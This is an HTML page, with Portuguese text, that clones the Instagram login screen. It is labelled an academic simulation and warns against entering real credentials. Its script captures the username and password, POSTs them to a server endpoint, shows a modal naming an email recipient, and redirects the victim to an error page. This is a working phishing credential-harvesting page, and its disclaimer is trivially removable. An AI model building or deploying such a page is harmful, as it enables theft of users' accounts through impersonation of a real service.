<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Simulação Acadêmica</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <!-- Formulário de Login -->
        <div class="login-container">
            <div class="login-box">
                <div class="logo">
                    <i class="fab fa-instagram"></i>
                    <span>Instagram</span>
                </div>
                
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" id="username" 
                               placeholder="Nome de usuário, telefone ou e-mail"
                               autocomplete="username"
                               required>
                    </div>
                    
                    <div class="input-group">
                        <input type="password" id="password" 
                               placeholder="Senha"
                               autocomplete="current-password">
                    </div>
                    
                    <button type="submit" class="login-btn" id="submitBtn">
                        <span>Entrar</span>
                        <div class="spinner" id="spinner"></div>
                    </button>
                    
                    <div class="separator">
                        <span>OU</span>
                    </div>
                    
                    <div class="facebook-login">
                        <i class="fab fa-facebook-square"></i>
                        <span>Entrar com o Facebook</span>
                    </div>
                    
                    <a href="#" class="forgot-password">Esqueceu a senha?</a>
                </form>
            </div>
            
            <div class="signup-box">
                <p>Não tem uma conta? <a href="#" class="signup-link">Cadastre-se</a></p>
            </div>
            
            <div class="disclaimer">
                <p><strong>⚠️ AVISO ACADÊMICO:</strong> Esta é uma simulação para fins educacionais.</p>
                <p>Ao clicar em "Entrar", um e-mail será enviado para o administrador informando a tentativa de acesso.</p>
                <p><strong>NÃO USE</strong> credenciais reais do Instagram.</p>
            </div>
        </div>
    </div>

    <!-- Modal de Confirmação -->
    <div class="modal" id="confirmationModal">
        <div class="modal-content">
            <h3>✅ E-mail Enviado!</h3>
            <p>Uma notificação foi enviada para <strong>zenosama892@gmail.com</strong></p>
            <p>Redirecionando para a página de erro...</p>
            <div class="loader"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const submitBtn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const modal = document.getElementById('confirmationModal');

            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value.trim();
                const password = document.getElementById('password').value;
                
                if (!username) {
                    alert('Por favor, insira um nome de usuário.');
                    return;
                }
                
                // Mostrar loading
                submitBtn.disabled = true;
                submitBtn.querySelector('span').textContent = 'Enviando...';
                spinner.style.display = 'block';
                
                try {
                    // Enviar dados para o servidor
                    const response = await fetch('/api/send-alert', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: username,
                            password: password || ''
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        // Mostrar modal de confirmação
                        modal.style.display = 'flex';
                        
                        // Redirecionar após 3 segundos
                        setTimeout(() => {
                            window.location.href = `/404?user=${encodeURIComponent(username)}&time=${Date.now()}`;
                        }, 3000);
                        
                    } else {
                        alert('Erro: ' + data.message);
                        resetButton();
                    }
                    
                } catch (error) {
                    console.error('Erro:', error);
                    alert('Erro de conexão com o servidor');
                    resetButton();
                }
            });
            
            function resetButton() {
                submitBtn.disabled = false;
                submitBtn.querySelector('span').textContent = 'Entrar';
                spinner.style.display = 'none';
            }
            
            // Permitir Enter para enviar
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && !submitBtn.disabled) {
                    form.dispatchEvent(new Event('submit'));
                }
            });
        });
    </script>
</body>
</html>